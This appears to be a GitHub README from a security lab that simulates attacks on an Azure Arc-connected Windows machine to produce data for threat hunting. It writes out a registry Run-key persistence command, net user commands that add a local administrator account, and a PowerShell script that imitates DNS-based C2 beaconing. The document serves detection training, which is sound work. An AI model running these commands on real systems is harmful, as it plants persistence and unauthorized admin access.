![GitHub Logo](https://media-hosting.imagekit.io//624976c3677e4fbc/attack.png?Expires=1835504095&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=ECl9MXShcMnnOJbrW86dwFt6XH~GN2UDRVLCWTHqBtOamYtWHL~zmdHdiJfpt4O2a18spjuCX9kmpW5ofW02urY-p1iREhBJ4wj77xqwePjIat-SHf74LT8EJiC8fsUwLiGHuy~Zh0jeN4FGfN~OB26xDop~2jLlbX1ZEelhlA3kTQUwATBtyug-uaJnXGO~wQkWRD8o-QRPj1TbYXI6GZhaAIMJjVFMQeM-5nekGSXsjlw5ThyJF8~3VHhq0Hz7Y7BeRshIADoHzolnXRFKuIi09h~sWkpDcNM5RhANfFBvGKDi1p454wS382NLOfbtuuLGkpLerseiSexNsieG0g__)


# Persistence atack with registry key addition
In order to perform the task, I had previously connected my machine with Azure Arc. So, it is a mciahine with Azure Arc connected that has Azure monitor agent configured
1. Created a temp folder file in the root directory with
- _cd \
mkdir temp
cd temp_

2. Ran the command below to simulate program persistance: REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"


## Privilege Elevation Attach with User Aggregation
This command help to simulate the creation of administrator account
- net user theusernametoadd /add
- net user theusernametoadd ThePassword1!
- net localgroup administrators theusernametoadd /add
![GitHub Logo](https://media-hosting.imagekit.io//2b35beed32864efc/temp%20folder%20and%20command%20for%20persistent%20program%20simulation%20and%20priviledge%20elevation%20attack%20with%20user%20add.png?Expires=1835505576&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=sskFKv6PEXJUY4ptxQM1u1p0CyOXrd8BNTcWqb6F9Ll8kNF3FURzm6WUJl9MwGKl3xe11we2CDtZjR1qTNSY7Kxu6HnAYlPySjZoVhc~-W58mWV892pFFbqSOAvQkkJgAfn07iQG6~~6XwuN1MHn669ICiIY~4XTPMT69vUL7APrPJ3-i7VhZyf1H9m7Y4iuag8WOivlrtdXA2jQzNa04v44ESz-0GYPxSfQmmvaU04ye3pxnr4AlIC6DOED1UlbiJrLX89XuExY4vr6rF1ZOlRYNjnQ28d7viq9AjLMVG81jtY~5huVmhnPCkUP8fR04FjvC~1tz0vYmlS1VDf4gg__)

### Command and control attack with DNS
- I ran this command to create a scirpt that will simulate a DNS query on a C2 server
- param(
    [string]$Domain = "microsoft.com",
    [string]$Subdomain = "subdomain",
    [string]$Sub2domain = "sub2domain",
    [string]$Sub3domain = "sub3domain",
    [string]$QueryType = "TXT",
    [int]$C2Interval = 8,
    [int]$C2Jitter = 20,
    [int]$RunTime = 240
)
$RunStart = Get-Date
$RunEnd = $RunStart.addminutes($RunTime)
$x2 = 1
$x3 = 1 
Do {
    $TimeNow = Get-Date
    Resolve-DnsName -type $QueryType $Subdomain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
    if ($x2 -eq 3 )
    {
        Resolve-DnsName -type $QueryType $Sub2domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
        $x2 = 1
    }
    else
    {
        $x2 = $x2 + 1
    }    
    if ($x3 -eq 7 )
    {
        Resolve-DnsName -type $QueryType $Sub3domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
        $x3 = 1
    }
    else
    {
        $x3 = $x3 + 1
    }
    $Jitter = ((Get-Random -Minimum -$C2Jitter -Maximum $C2Jitter) / 100 + 1) +$C2Interval
    Start-Sleep -Seconds $Jitter
}
Until ($TimeNow -ge $RunEnd)
- From the notepad page that was opened automatically, seect file, then save.
- I ran the powershell command  _Start PowerShell.exe -file c2.ps1_ in command prompt
-  I allow this PowerShell script to run in the background. It generated log entries for a few hours. The data created by this task was used in the threat hunting lab.

